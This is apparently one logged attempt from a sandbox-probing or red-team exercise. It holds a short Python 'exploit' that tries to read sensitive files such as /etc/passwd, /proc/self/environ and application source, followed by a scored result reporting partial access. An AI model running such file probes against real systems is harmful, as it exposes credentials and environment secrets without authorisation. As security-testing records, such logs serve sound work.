# Attempt 152 - 2026-06-07T18:56:50.400508+00:00
## Template: I | Score: 1 - Host Info
## Exploit code
```python
# Extensive filesystem probe via open()
results = []

paths = [
    "/data/config.json",
    "/data/current-config.json",
    "/data/sample.txt",
    "/data/docs/index.html",
    "/data/i18n/en.json",
    "/data/logs/access.log",
    "/proc/self/cmdline",
    "/proc/self/maps",
    "/proc/self/environ",
    "/proc/version",
    "/etc/passwd",
    "/etc/hostname",
    "/app/main.py",
    "/app/__main__.py",
    "/home/hackmonty/.bashrc",
    "/tmp/secret.txt",
    "/tmp/hackmonth.txt",
]

for p in paths:
    try:
        f = open(p)
        content = f.read()
        results.append(f"OK {p}: {content[:200]}")
    except PermissionError as e:
        results.append(f"PERM {p}: {e}")
    except FileNotFoundError as e:
        results.append(f"MISS {p}")
    except IsADirectoryError as e:
        results.append(f"DIR {p}")
    except Exception as e:
        results.append(f"ERR {p}: {type(e).__name__}: {str(e)[:60]}")

for r in results:
    print(r)
```

## Result
Context: Template I NameLookup - open() accessible! Read /data config files. Secret paths blocked by PermissionError. Score 3, demoted to 1 on revalidation (0/3 match).
Score: 1/5 - Host Info
